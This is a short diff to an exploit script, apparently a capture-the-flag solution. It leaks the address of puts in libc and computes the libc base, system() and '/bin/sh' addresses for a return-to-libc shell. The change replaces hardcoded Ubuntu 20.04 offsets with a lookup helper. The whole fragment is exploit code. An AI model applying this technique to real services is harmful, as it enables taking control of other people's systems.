@@ -124,10 +124,14 @@ let leaked_puts = recv(conn, 8)
 let puts_addr = u64(leaked_puts)
 print("[+] Leaked puts@libc:", hex(puts_addr))
 
-# Calculate libc base
-let libc_base = puts_addr - 0x809c0  # Ubuntu 20.04 offset
-let system = libc_base + 0x4f440
-let bin_sh = libc_base + 0x1b3e9a
+# Calculate libc base dynamically
+let libc_template = Libc("ubuntu20.04")
+let puts_offset = libc_template["symbols"]["puts"]
+let libc_base = puts_addr - puts_offset
+
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let system = libc_resolved["symbols"]["system"]
+let bin_sh = libc_resolved["strings"]["bin_sh"]
 
 print("[+] Libc base:", hex(libc_base))
 print("[+] system():", hex(system))
